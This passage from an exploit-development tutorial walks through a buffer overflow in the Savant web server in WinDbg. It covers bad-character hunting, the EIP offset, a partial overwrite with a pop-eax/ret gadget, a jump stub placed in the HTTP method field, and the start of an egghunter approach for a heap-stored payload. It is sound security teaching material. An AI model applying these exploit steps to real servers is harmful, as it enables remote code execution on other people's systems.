buffer:\n0:004\u0026gt; dds esp l2 0505ea1c 00414141 savant+0x14141 0505ea20 0505ea74 by some reason, the second dword in a stack points to a location that is very close to the stack! it\u0026rsquo;s like pointing an internal stack location. let\u0026rsquo;s analyze it:\n0:004\u0026gt; dc 0505ea74 0505ea74 00544547 00000000 00000000 00000000 get............. 0505ea84 00000000 00000000 4141412f 41414141 ......../aaaaaaa 0505ea94 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eaa4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eab4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eac4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505ead4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eae4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa it looks like it\u0026rsquo;s a pointer to the http request content, as, in such location, we can see that there is the http method stored, followed by several null bytes, and our controlled buffer.\nbadchars do not break the buffer, they break the program behavior in the previous buffer overflows, when inserting badchars to check the presence of them, we could see the specific characters that make the buffer break, as the application still crashes and we can inspect the badchar buffer in depth.\nbut there can be the case where inserting badchars just prevent the application from crashing, or that make the application crash but the eip is not overwritten anymore. in that case, we cannot see which one is the problematic one, but we have to infer it by other means. that is why it is important to always try sending a buffer with the same character, and always a character that is commonly accepted, as \u0026ldquo;a\u0026rdquo;.\nin order to detect which badchars are preventing the application from crashing, we will do a binary search. the first half of the badchars will be sent, while the other is not sent. we will analyze in which half of the badchars array the application keeps running, and in which one does not. we will keep repeating such process iteratively until we find the badchar(s) that are preventing the application from running.\nby doing this in our savant application, we overwrite the instruction pointer when the second half of the badchars are sent. that means that the badchars are in the first half. we will break the first half in two to detect which badchars are the problematic, and so on. after deleting some badchars, we see that the app crashes and eip is overwritten, but we have to inspect if any of the badchars are not stored in the buffer like we previously did n the base buffer overflow:\n0:005\u0026gt; dd esp l30 0473ea1c 0473fe00 0473ea74 0041703c 005d2bf0 0473ea2c 005d2bf0 00000000 00000000 00000000 0473ea3c 00000000 00000000 00000000 00000000 0473ea4c 00000000 00000000 00000000 00000000 0473ea5c 00000000 00000000 00000000 00000000 0473ea6c 00000000 00000002 00544547 00000000 0473ea7c 00000000 00000000 00000000 00000000 0473ea8c 0302012f 07060504 0c0b0908 11100f0e 0473ea9c 15141312 19181716 1d1c1b1a 21201f1e 0473eaac 25242322 29282726 2d2c2b2a 31302f2e 0473eabc 35343332 39383736 3d3c3b3a 41403f3e 0473eacc 45444342 49484746 4d4c4b4a 51504f4e 0:005\u0026gt; db 0473ea8d lff 0473ea8d 01 02 03 04 05 06 07 08-09 0b 0c 0e 0f 10 11 12 ................ 0473ea9d 13 14 15 16 17 18 19 1a-1b 1c 1d 1e 1f 20 21 22 ............. !\u0026#34; 0473eaad 23 24 25 26 27 28 29 2a-2b 2c 2d 2e 2f 30 31 32 #$%\u0026amp;\u0026#39;()*+,-./012 0473eabd 33 34 35 36 37 38 39 3a-3b 3c 3d 3e 3f 40 41 42 3456789:;\u0026lt;=\u0026gt;?@ab 0473eacd 43 44 45 46 47 48 49 4a-4b 4c 4d 4e 4f 50 51 52 cdefghijklmnopqr 0473eadd 53 54 55 56 57 58 59 5a-5b 5c 5d 5e 5f 60 61 62 stuvwxyz[\\]^_`ab 0473eaed 63 64 65 66 67 68 69 6a-6b 6c 6d 6e 6f 70 71 72 cdefghijklmnopqr 0473eafd 73 74 75 76 77 78 79 7a-7b 7c 7d 7e 7f 80 81 82 stuvwxyz{|}~.... 0473eb0d 83 84 85 86 87 88 89 8a-8b 8c 8d 8e 8f 90 91 92 ................ 0473eb1d 93 94 95 96 97 98 99 9a-9b 9c 9d 9e 9f a0 a1 a2 ................ 0473eb2d a3 a4 a5 a6 a7 a8 a9 aa-ab ac ad ae af b0 b1 b2 ................ 0473eb3d b3 b4 b5 b6 b7 b8 b9 ba-bb bc bd be bf c0 c1 c2 ................ 0473eb4d c3 c4 c5 c6 c7 c8 c9 ca-cb cc cd ce cf d0 d1 d2 ................ 0473eb5d d3 d4 d5 d6 d7 d8 d9 da-db dc dd de df e0 e1 e2 ................ 0473eb6d e3 e4 e5 e6 e7 e8 e9 ea-eb ec ed ee ef f0 f1 f2 ................ 0473eb7d f3 f4 f5 f6 f7 f8 f9 fa-fb fc fd fe ff 41 41 .............aa 0d is not appearing, so we can delete it although it is not breaking the buffer, it is completely ignored so if our shellcode has such character it probably will be skipped by the program. after deleting 0d, the eip does not point to our controlled location and we have to perform a binary search again. we end detecting all the badchars via different methods. note that you could have to go back and forth with the different methods as each badchar can make the application behave different.\nnow, if we try to obtain the number off bytes that we have to send to overwrite eip via the msf-pattern_create tool, we obtain that it causes a different access violation in which our instrucction pointer is not ovewritten with an unique value, as we would expect. we have to also manually split the buffer using different characters to manually detect the offset by analyzing which value does eip have. if we do that, we will detect that it\u0026rsquo;s 253 bytes prior to the instruction pointer.\n*** warning: unable to verify checksum for savant.exe eax=ffffffff ebx=001c2bf0 ecx=21d8b80f edx=00000000 esi=001c2bf0 edi=0041703c eip=42424242 esp=0489ea1c ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 42424242 ?? ??? 0:009\u0026gt; dds esp 0489ea1c 00434343 savant+0x34343 0489ea20 0489ea74 0489ea24 0041703c savant+0x1703c again, we only have 3 bytes in esp so we cannot store our shellcode there. but we have controlled eip. now that we have confirmed that the offset is correct, we need to find a good instruction to overwrite eip with that will allow us to take control of the execution flow. let\u0026rsquo;s use the narly windbg extension to list the protections of the loaded modules. to make our exploit as portable as possible, we need to choose a module that comes with the application. in addition, the module should not be compiled with any protections. let’s load the extension and list the protections of all loaded modules:\n0:009\u0026gt; !nmod 00400000 00452000 savant /safeseh off savant.exe 62f10000 63120000 comctl32_62f10000 /safeseh on /gs *aslr *dep c:\\windows\\winsxs\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.5678_none_a867ae788670d4c7\\comctl32.dll 679b0000 67a45000 textshaping /safeseh on /gs *aslr *dep c:\\windows\\system32\\textshaping.dll 69d80000 69d8e000 winrnr /safeseh on /gs *aslr *dep c:\\windows\\system32\\winrnr.dll 69d90000 69da0000 wshbth /safeseh on /gs *aslr *dep c:\\windows\\system32\\wshbth.dll 6a230000 6a246000 pnrpnsp /safeseh on /gs *aslr *dep c:\\windows\\system32\\pnrpnsp.dll 6a980000 6a991000 napinsp /safeseh on /gs *aslr *dep c:\\windows\\system32\\napinsp.dll 6bfd0000 6c05d000 comctl32 /safeseh on /gs *aslr *dep c:\\windows\\winsxs\\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.4355_none_c0dc01d438beab35\\comctl32.dll 6c980000 6c988000 wsock32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\wsock32.dll the savant module (main application) does not have any protection. however, it is mapped at an address that contains a null byte at the start. having a null byte in the address space of the module is an issue, as the application will treat our buffer as a string when inserting the instruction in eip. a null byte is a string terminator. we need a different approach.\nchoosing an address of the other modules, which are microsoft modules, would mean that the exploit is dependent on whatever version on windows is installed on our target (as these dlls probably will change). in addition, we also have to deal with another mitigations like aslr.\nto overcome this issue, we will abuse something that we have already discovered: our buffer is treated as a string and therefore a null byte is added at the end of it. remember it:\n0:009\u0026gt; dds esp 0489ea1c 00434343 savant+0x34343 this provides us with an interesting opportunity to use a technique known as a partial eip overwrite. because the module we want to attack is mapped in an address range that begins with a null byte, we could use the null byte that the application inserts on our buffer as part of our overwrite.\nindeed, if we send as payload only three bytes to overwrite eip, we still get the same null byte applied:\n0:009\u0026gt; dds esp 0489ea1c 00434343 savant+0x34343 so we could insert any address inside the savant module using the null byte that is added in that position. but now we need to decide what instruction we want to redirect the execution flow to. the bad thing is that esp does not point to our buffer nor any register.\nduring our initial crash analysis, we noticed that the second dword on the stack at the time of the crash points very close to our current stack pointer. in fact, it always seems to point to the http method, followed by the rest of the data we sent:\n0:004\u0026gt; dds esp l2 0505ea1c 00414141 savant+0x14141 0505ea20 0505ea74 0:004\u0026gt; dc 0505ea74 0505ea74 00544547 00000000 00000000 00000000 get............. 0505ea84 00000000 00000000 4141412f 41414141 ......../aaaaaaa 0505ea94 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eaa4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eab4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eac4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505ead4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0505eae4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa our goal then is to find an assembly instruction sequence that redirects the execution flow to this data. thinking that this value is the second value in esp, we could do a pop, ret instruction: the first pop would remove the first dword from the stack. this would make esp point to the memory address that contains our buffer starting with the http get method. after executing the ret instruction, we should be placed right at the beginning of our http method. using such an instruction sequence would mean that we will have to execute the assembly instructions generated by the get method opcodes. let\u0026rsquo;s see this instructions:\n0:008\u0026gt; dds poi(esp+4) 047bea74 00544547 047bea78 00000000 047bea7c 00000000 047bea80 00000000 047bea84 00000000 047bea88 00000000 047bea8c 4141412f 047bea90 41414141 047bea94 41414141 047bea98 41414141 0:008\u0026gt; u poi(esp+4) 047bea74 47 inc edi 047bea75 45 inc ebp 047bea76 54 push esp 047bea77 0000 add byte ptr [eax],al 047bea79 0000 add byte ptr [eax],al 047bea7b 0000 add byte ptr [eax],al 047bea7d 0000 add byte ptr [eax],al 047bea7f 0000 add byte ptr [eax],al the first instructions do not seem to affect the execution flow or generate any access violations. they are inc operations, and a push instruction that pushes esp to the stack. the \u0026ldquo;00\u0026rdquo; instructions use the add operation, using the memory address of where eax points. these instructions could be problematic as they assume that eax points to a valid memory address. remember that we want to perform the pop, ret operation? let\u0026rsquo;s see if the value we want to pop (the top of the stack) is a valid memory address:\n0:008\u0026gt; !teb teb at 00258000 exceptionlist: 01a3ff60 stackbase: 01a40000 stacklimit: 01a3c000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00258000 environmentpointer: 00000000 clientid: 00000ec0 . 00000cc0 rpchandle: 00000000 tls storage: 004c7520 peb address: 00253000 lasterrorvalue: 10038 laststatusvalue: c0000008 count owned locks: 0 harderrormode: 0 0:008\u0026gt; dds esp 01a3ea1c 01a3fe00 // we are popping this value 01a3ea20 01a3ea74 // we want to return here, address of where our payload is stored the value that we are popping is inside the stackbase and stacklimit addresses, which means that it is inside the stack! as it is a valid address, we will pop it into eax so that the instructions that use eax are valid! we need to find a pop eax, ret instructions inside the savant module. let\u0026rsquo;s see which instructions are:\nmsf-nasm_shell nasm \u0026gt; pop eax 00000000 58 pop eax nasm \u0026gt; ret 00000000 c3 ret let\u0026rsquo;s search for these instructions in the module and pick any of them that does not contain badchars:\n0:008\u0026gt; lm m savant browse full module list start end module name 00400000 00452000 savant c (no symbols) 0:008\u0026gt; s -b 00400000 00452000 58 c3 00418674 58 c3 33 c0 c3 55 8b ec-51 51 83 7d 08 00 ff 75 x.3..u..qq.}...u 0041924f 58 c3 a1 68 a2 44 00 56-83 f8 03 57 75 66 53 33 x..h.d.v...wufs3 004194f6 58 c3 33 c0 c3 a1 68 a2-44 00 83 f8 03 75 06 a1 x.3...h.d....u.. 00419613 58 c3 a1 4c a2 44 00 8d-0c 80 a1 50 a2 44 00 8d x..l.d.....p.d.. 0041a531 58 c3 33 c0 c3 83 3d 68-ae 43 00 ff 53 55 56 57 x.3...=h.c..suvw 0041af7f 58 c3 8b 65 e8 33 db 33-f6 83 4d fc ff 3b f3 74 x..e.3.3..m..;.t 0041b464 58 c3 33 c0 c3 55 8b ec-83 ec 0c 8b 45 0c 53 56 x.3..u......e.sv 0041b9fa 58 c3 33 c0 c3 0f b6 44-24 04 8a 4c 24 0c 84 88 x.3....d$..l$... 0041ba2e 58 c3 55 8b ec 83 ec 18-53 56 57 6a 19 e8 b6 f3 x.u.....svwj.... 0041c49a 58 c3 e8 c6 b9 ff ff 83-c0 54 c3 55 8b ec 81 ec x........t.u.... 0041cc30 58 c3 8b 65 e8 33 ff 89-7d dc 83 4d fc ff 8b 5d x..e.3..}..m...] 0041cce4 58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 8b 75 d8 x..e.3.3..m...u. 0041eb74 58 c3 33 c0 c3 55 8b ec-83 ec 78 8d 45 88 6a 78 x.3..u....x.e.jx 0041fe21 58 c3 8b 65 e8 33 ff 89-7d d4 83 4d fc ff 8b 75 x..e.3..}..m...u 0041fe7e 58 c3 8b 65 e8 33 ff 33-db 83 4d fc ff 3b df 74 x..e.3.3..m..;.t 00420904 58 c3 8b 65 e8 33 ff 33-f6 83 4d fc ff 3b f7 74 x..e.3.3..m..;.t 00420a1d 58 c3 8b 65 e8 33 f6 33-ff 83 4d fc ff 3b fe 74 x..e.3.3..m..;.t 00420e69 58 c3 8b 65 e8 33 db 89-5d dc 83 4d fc ff 8b 75 x..e.3..]..m...u 00420ed8 58 c3 8b 65 e8 33 db 33-ff 83 4d fc ff 8b 75 e0 x..e.3.3..m...u. the first one is a good candidate. replacing such address with the eip overwrite leads us in landing to such address. let\u0026rsquo;s analyze it:\n0:009\u0026gt; bp 0x418674 *** warning: unable to verify checksum for savant.exe 0:009\u0026gt; g breakpoint 0 hit eax=00000000 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c eip=00418674 esp=0481ea1c ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 savant+0x18674: 00418674 58 pop eax 0:004\u0026gt; t breakpoint 0 hit eax=00000000 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c eip=00418674 esp=0481ea1c ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 savant+0x18674: 00418674 58 pop eax 0:004\u0026gt; t eax=0481fe60 ebx=016d2bf0 ecx=0000000e edx=77732da0 esi=016d2bf0 edi=0041703c eip=00418675 esp=0481ea20 ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 savant+0x18675: 00418675 c3 ret 0:004\u0026gt; dds esp 0481ea20 0481ea74 0481ea24 0041703c savant+0x1703c 0:004\u0026gt; dds poi(esp) 0481ea74 00544547 0481ea78 00000000 0481ea7c 00000000 0481ea80 00000000 0481ea84 00000000 0481ea88 00000000 0481ea8c 4141412f 0481ea90 41414141 0481ea94 41414141 0481ea98 41414141 we can see that now we are landing on the address that we want. because we made sure that eax would contain a valid memory address, we should be able to execute these instructions without generating an access violation, until we reach our buffer of 0x41 characters. while this solution works, executing assembly instructions generated by the opcodes of our http method is not very clean. let’s explore some other options in the hopes of finding a more elegant way of reaching the start of our 0x41 buffer.\nfirst, let\u0026rsquo;s think that we are sending the get method in our request, as well as the route, and such values are the ones being interpreted when the pop, ret instruction occurs. what if we change the http method used and insert some bytes? if instruction bytes can be inserted, when performing the jump, it would jump to our controlled instruction. we could insert a short jump instruction instead of get in order to jump directly to our payload. let\u0026rsquo;s try to modify the method used and insert some \u0026ldquo;c\u0026rdquo; characters as the method. they get reflected:\nsavant+0x18674: 00418674 58 pop eax 0:008\u0026gt; dc poi(esp+4) 0478ea74 43434343 43434343 00000000 00000000 cccccccc........ 0478ea84 00000000 00000000 4141412f 41414141 ......../aaaaaaa 0478ea94 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0478eaa4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0478eab4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0478eac4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0478ead4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa 0478eae4 41414141 41414141 41414141 41414141 aaaaaaaaaaaaaaaa now, we want to replace our \u0026ldquo;c\u0026quot;s for a short jump instruction. let\u0026rsquo;s see how much bytes do we have to jump:\n0:008\u0026gt; db poi(esp+4) 0478ea74 43 43 43 43 43 43 43 43-00 00 00 00 00 00 00 00 cccccccc........ 0478ea84 00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41 ......../aaaaaaa 0478ea94 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa 0478eaa4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa 0478eab4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa 0478eac4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa 0478ead4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa 0478eae4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 aaaaaaaaaaaaaaaa now let\u0026rsquo;s put a breakpoint on tbd and perform the short jump operation:\n0:008\u0026gt; a eip 0478ea74 jmp 0x0478ea8d jmp 0x0478ea8d 0478ea76 0:008\u0026gt; u eip 0478ea74 eb17 jmp 0478ea8d we would have to add eb17 as the http method. however, when inserting it, we see that the \u0026ldquo;eb\u0026rdquo; bytes are replaced for \u0026ldquo;cb\u0026rdquo;, meaning that such character has been mangled:\n0475ea74 cb retf 0475ea75 17 pop ss 0475ea76 0000 add byte ptr [eax],al 0475ea78 0000 add byte ptr [eax],al given that this memory is most likely allocated separately from the allocation storing the rest of the buffer, it is possible that different operations are done that cause our byte to get mangled. therefore, take note as you might find different memory allocations with different checks and operations performed on the data stored in them, and you have to find a different set of bad characters for such section. for now, let\u0026rsquo;s assume that we can\u0026rsquo;t use a short jump operation. we need another solution. we could maybe use the island hopping technique, modifying the esp to point to our buffer and jump to it. however, we are going to see other alternative. let\u0026rsquo;s see conditional jumps. conditional jumps are a jump operation that only is executed is specific conditions are done. this process occurs in two steps. the first step is a test on the condition, and the second step is a jump depending on the condition. note: there are a number of conditional jumps in the assembly language that depend on registry values, flag registers, and comparisons between signed or unsigned operands. while we do have a limited memory space that is allocated for the http method, it should still be more than enough for us to set up a condition followed by a jump for that condition. we will use the je (jump if equal) condition. this instruction will execute a short jump and the condition from the jump is based on the value of the zf (zero flag) register. more specifically, the jump is taken if the value of the zf register is 1 (true). note: the zero flag register is a single bit flag that is used on most architectures. on x86/x64, it is stored in a dedicated register called zf. this flag is used to check the result of arithmetic operations. it is set to 1 (true) if the result of an arithmetic operation is zero and otherwise set to 0 (false).\nin order to jump, we need to set the value of the zf to 1 so that the condition is true. to archieve that, we will use a xor operation between a register as destination and as source. any register is valid, as long as the instruction does not contain badchars. doing a xor with the same destination and source sets the register to 0, nulling the register. after the xor, we will do a test instruction with the same register as both operands. as the result is 0, the zf results to be 1. then we can perform the je o jz (they both check if zf is set to 1). let\u0026rsquo;s craft these operations (we will use ecx as the dummy register for the xor and test operations):\nnasm \u0026gt; xor ecx, ecx 00000000 31c9 xor ecx,ecx nasm \u0026gt; test ecx, ecx 00000000 85c9 test ecx,ecx nasm \u0026gt; je 0x17 00000000 0f8411000000 jz near 0x17 the last instruction contains three null bytes. this is problematic but remember that the rest of the space between the http method and the slash and our payload is full of zeros. we can skip from sending these null bytes as they will be already stored in such place by the application:\nhttpmethod = b\u0026#34;\\x31\\xc9\\x85\\xc9\\x0f\\x84\\x11\u0026#34; + b\u0026#34; /\u0026#34; # xor ecx, ecx; test ecx, ecx; je 0x17 if we send this and analyze the code, now the instructions are not mangled and that it is a clean jump to our shellcode:\n046bea74 31c9 xor ecx,ecx 046bea76 85c9 test ecx,ecx 046bea78 0f8411000000 je 046bea8f 0:008\u0026gt; u 046bea8f 046bea8f 41 inc ecx 046bea90 41 inc ecx 046bea91 41 inc ecx 046bea92 41 inc ecx 046bea93 41 inc ecx 046bea94 41 inc ecx 046bea95 41 inc ecx let\u0026rsquo;s see the zf value after the xor and test operations:\n0:008\u0026gt; r zf zf=1 0:008\u0026gt; t eax=046bfe60 ebx=01822bf0 ecx=00000000 edx=77ea2da0 esi=01822bf0 edi=0041703c eip=046bea78 esp=046bea24 ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 046bea78 0f8411000000 je 046bea8f [br=1] 0:008\u0026gt; t eax=046bfe60 ebx=01822bf0 ecx=00000000 edx=77ea2da0 esi=01822bf0 edi=0041703c eip=046bea8f esp=046bea24 ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 046bea8f 41 inc ecx we successfully landed on our code, but if we see closely, we land on a 2 byte offset:\n0:008\u0026gt; dd 046bea8f-4 046bea8b 41412f00 41414141 41414141 41414141 this is not a problem as we can fix the offset, or add some nops before our shellcode in case that the offset is not consistent. once we know how to execute our code, the next step is to see if we have enough space.\nafter calculating how many \u0026ldquo;a\u0026quot;s does the buffer store, we see that the result is 251 bytes. while generating a reverse shell payload in previous modules, the size of the resulting shellcode was over 300 bytes. a more advanced payload, such as a meterpreter, would require even more space. even if we were to use the http method buffer, rather than jumping over it, we would still not have enough space for a large payload.\ntherefore, we have to find a way to store a larger shellcode in our current exploit.\nstoring the shellcode in the heap we have to find a way to store the shellcode in other place of the application. another option is to use a smaller payloads with fewer features, but this is a last resort. we have to store our shellcode in a different memory region before the crash and then redirect the execution flow to that additional buffer. we will use the space we already have to create a \u0026ldquo;stager\u0026rdquo; shellcode that jumps to this second memory region, once we find it. to determine what will be stored in memory by our vulnerable application, we could either perform a very in-depth reverse engineering process on the application, or we could make some educated guesses based on the type of application we are attacking. in the case of this application, a web server, we could do two things:\nrather than terminating the http request with \\r\\n, we can try to add an additional buffer between the carriage return and the new line. doing this results in the application not crashing, which means that this method does not work here. sending a buffer after we end the http request (after \\r\\n). doing this results in hitting our pop, ret breakpoint and in a crash, so we will stick to this method. once we manage to add another shellcode of a bigger space (400 bytes), we need to find where is it stored in memory. for that, some bytes of the shellcode have been given a special value (in my case \u0026ldquo;w00tw00t\u0026rdquo;) so it is possible to find them. now, let\u0026rsquo;s find this bytes once we hit the breakpoint:\n0:004\u0026gt; s -a 0x0 l?80000000 w00tw00t 01805a86 77 30 30 74 77 30 30 74-41 41 41 41 41 41 41 41 w00tw00taaaaaaaa seems that we were able to locate our payload. now, let\u0026rsquo;s see if the shellcode is complete by adding 400 bytes:\n0:004\u0026gt; db 01805a86 +0n400 01805c16 41 41 41 41 41 41 41 41-00 00 00 00 00 00 00 00 aaaaaaaa........ after a 400 bytes offset, our payload is stored still. that means that we can store our complete buffer here as we have space. now, let\u0026rsquo;s see where this buffer is stored.\nlet\u0026rsquo;s check if it is in the stack of the thread:\n0:004\u0026gt; !teb teb at 002bc000 exceptionlist: 02d4ff60 stackbase: 02d50000 stacklimit: 02d4c000 surprising, it is not in the current stack. let\u0026rsquo;s use an extension from windbg called !address that tells us in which memory region our shellcode is:\n0:004\u0026gt; !address 01805a86 mapping file section regions... mapping module regions... mapping peb regions... mapping teb and stack regions... mapping heap regions... mapping page heap regions... mapping other regions... mapping stack trace database regions... mapping activation context regions... usage: heap base address: 01800000 end address: 0180f000 region size: 0000f000 ( 60.000 kb) state: 00001000 mem_commit protect: 00000004 page_readwrite type: 00020000 mem_private allocation base: 01800000 allocation protect: 00000004 page_readwrite more info: heap owning the address: !heap 0x1800000 more info: heap segment more info: heap entry containing the address: !heap -x 0x1805a86 content source: 1 (target), length: 957a according to this output, our buffer is stored on the heap. in windows operating systems, when a process starts, the heap manager automatically creates a new heap called the default process heap. at a very high level, heaps are big chunks of memory that are divided into smaller pieces to fulfill dynamic memory allocation requests. although some processes only use the default process heap, many will create additional heaps using the heapcreate api (or its lower-level interface ntdll!rtlcreateheap) to isolate different components running in the process itself. several user-space windows apis (virtualallocex, virtualfreeex, heapalloc, and heapfree) will eventually call into their respective native functions in ntdll.dll (rtlallocateheap and rtlfreeheap). other processes make substantial use of the c runtime heap for most dynamic allocations (malloc / free functions). these heap implementations, defined as nt heap, eventually make use of the windows heap manager functions in ntdll.dll to interface with the kernel windows virtual memory manager and to allocate memory dynamically.\nthe summary is that there is no way to determine the location of the buffer before it is stored in memory. this rules out the possibility of adding a static offset, short jump, island hopping, or any of the previous techniques to make the instruction pointer jump to this location.\nwe need to explore other methods of finding the location of our buffer as it is stored in the heap dinamically. this is where the egghunter approach comes.\negghunters what is an egghunter when we need to find the memory address of another buffer under our control that does not take a static location, we often use an egghunter. the term egghunter refers to a first-stage payload that can search the process virtual address space (vas) for an egg, an unique tag that prepends the payload we want to execute. once the egg (pattern) has been found, the egghunter transfers the execution to the shellcode by jumping to the found address.\nsince egghunters are made to deal with space restrictions, they are written to be as small as possible. also, the egghunting code needs to be fast, as, the fastest it executes, the less time the application hangs. these type of payloads also need to be robust and handle access violations that are raised while scanning the virtual address space. the access violations usually occur while attempting to access an unmapped memory address or addresses we don’t have access to. in the past, we would typically write the assembly code for our egghunter and then proceed to compile the code. after, we would disassemble the compiled binary in software such as ida to get the opcodes for it. however, this is very consuming and we have a better alternative.\nkeystone engine writing shellcode is much more streamlined using a tool like keystone engine. this tool is an assembler framework for several languages, like python. with it, we can write our asm code in a python script and let the keystone framework do the rest. installing keystone in kali is pretty straightforward once python3 is installed:\npip install keystone-engine collecting keystone-engine downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl.metadata (1.8 kb) downloading keystone_engine-0.9.2-py2.py3-none-manylinux1_x86_64.whl (1.8 mb) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 mb 22.5 mb/s eta 0:00:00 installing collected packages: keystone-engine successfully installed keystone-engine-0.9.2 for example, let\u0026rsquo;s use this snippet of code for a x64 architecture in 32 bits:\nfrom keystone import * code = ( \u0026#34; \u0026#34; \u0026#34; start: \u0026#34; \u0026#34; xor eax, eax ;\u0026#34; \u0026#34; add eax, ecx ;\u0026#34; \u0026#34; push eax ;\u0026#34; \u0026#34; pop esi ;\u0026#34; ) # initialize engine in 32-bit mode ks = ks(ks_arch_x86, ks_mode_32) encoding, count = ks.asm(code) instructions = \u0026#34;\u0026#34; for dec in encoding: instructions += \u0026#34;\\\\x{0:02x}\u0026#34;.format(int(dec)).rstrip(\u0026#34;\\n\u0026#34;) print(\u0026#34;opcodes = (\\\u0026#34;\u0026#34; + instructions + \u0026#34;\\\u0026#34;)\u0026#34;) now, if we execute this program, the following result is obtained, crafting the opcodes instruction by instruction:\nopcodes = (\u0026#34;\\x31\u0026#34;) opcodes = (\u0026#34;\\x31\\xc0\u0026#34;) opcodes = (\u0026#34;\\x31\\xc0\\x01\u0026#34;) opcodes = (\u0026#34;\\x31\\xc0\\x01\\xc8\u0026#34;) opcodes = (\u0026#34;\\x31\\xc0\\x01\\xc8\\x50\u0026#34;) opcodes = (\u0026#34;\\x31\\xc0\\x01\\xc8\\x50\\x5e\u0026#34;) let\u0026rsquo;s try to verify the opcodes using the tool that we already know called msf-nasm_shell:\nmsf-nasm_shell nasm \u0026gt; xor eax, eax 00000000 31c0 xor eax,eax nasm \u0026gt; add eax, ecx 00000000 01c8 add eax,ecx nasm \u0026gt; push eax 00000000 50 push eax nasm \u0026gt; pop esi 00000000 5e pop esi as we can see, the opcodes returned from the tool are exactly the same, but the tool is much more flexible as we will be able to test our assembly code much faster. please note that while keystone saves a large amount of time, it is not without fault. depending on the assembly code we are working with, some opcodes, like short jumps, may not be generated correctly. it\u0026rsquo;s recommended going over the assembly instructions in memory (with a debugger) to confirm that the generated opcodes are correct.\nanalyzing a public egghunter remember that the egghunter needs to go around all the vas of a process in order to search for the \u0026ldquo;egg\u0026rdquo;. regarding this search, one of the issues egghunters must account for is the fact that there is no way of telling beforehand if a memory page is mapped, if it has the correct permissions to access it, or what kind of access is allowed on that memory page. if this is not handled correctly, we will generate an access violation and cause a crash. to combat this issue, what egghunter often do is check the protections or access policies of the memory region before inspecting it. in windows, the ntaccesscheckandauditalarm call is used, as it returns a different error code depending on the properties of the memory accessed. for example, the error code, status_no_impersonation_token (0xc000005c), is returned due to various checks made by the function before it attempts to use any of the provided arguments. note: ntaccesscheckandauditalarm will work without issues in the egghunter unless we are running in the context of a thread that is impersonating a client. in these cases, it might not work as expected by our egghunter code.\nbecause the public egghunter that we will analyze uses such system call, let\u0026rsquo;s first explain what are system calls (often called syscalls). a syscall is basically an interface between the user-mode process and the kernel. invoking a system call is often done through a special assembly instruction or an interrumpt (also known as trap or exception). whenever these actions are done, the operating system takes over, performs the proper operation (in kernel context) and returns to the running software with the result of the operation.\nthe egghunter that we analyze here will take advantage of this. rather than crawling the memory inside our program, in risk of an access violation that could break the program, it uses a syscall with a specific memory address in order to inspect its properties. before the desired function is called, the operating system will attempt to copy the arguments we provide in user-space, to kernel-space. if the memory address where the function arguments reside is not mapped, or if we don’t have the appropriate access, the copy operation will cause an access violation. the access violation will be handled in the background and then return a status_access_violation code (0xc0000005), allowing our egghunter to continue to the next memory page.\nbefore we use a system call, the operating system needs to know which function it should call, as well as its parameters. in the case of x86, the function to use is specified by setting up a unique system call number in the eax register, each of the numbers being mapped to a specific function. then, the arguments are pushed into the stack, and the stack pointer (esp) is moved to the edx register, as it is used by the system call.\nas part of the system call, the operating system will try to access the memory address where the address have been stored, to copy them from user-space to kernel space. if edx points to an unmapped memory address, or one we can\u0026rsquo;t access due to lack of permissions, the operating system will trigger an access violation, which it will handle for us and return the status_access_violation code in eax. therefore, by using the ntaccesscheckandauditalarm system call, we will only get two results:\nif the memory page we check is valid and 